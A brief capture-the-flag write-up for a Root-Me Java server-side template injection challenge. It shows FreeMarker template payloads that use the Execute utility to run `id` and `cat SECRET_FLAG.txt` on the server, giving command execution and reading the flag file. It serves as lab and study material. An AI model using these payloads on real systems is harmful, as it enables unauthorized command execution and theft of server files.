# Java - Server-side Template Injection

Reference:

https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Server-Side%20Template%20Injection%20RCE%20For%20The%20Modern%20Web%20App%20-%20BlackHat%2015.pdf?\_gl=1_rwpkva_\_ga_NTM2MDg4NDI5LjE2NjExMzM0Njc._\_ga\_SRYSKX09J7\*MTY2MjM1ODc2My40OS4xLjE2NjIzNTkyMTguMC4wLjA.

***

Objective: Exploit the vulnerability in order to retrieve the validation password in the file SECRET\_FLAG.txt.

It is server site template injection for java, then I searched it in hacktricks.

So I entered this line:

`${class.getResource("").getPath()}`

And saw this request:

meaning there is some filter.

And did send some of commands succesively:

`${"freemarker.template.utility.Execute"?new()("id")}`

This one worked obviously. So sent this:

`${"freemarker.template.utility.Execute"?new()("cat SECRET_FLAG.txt")}`

I got the answer.
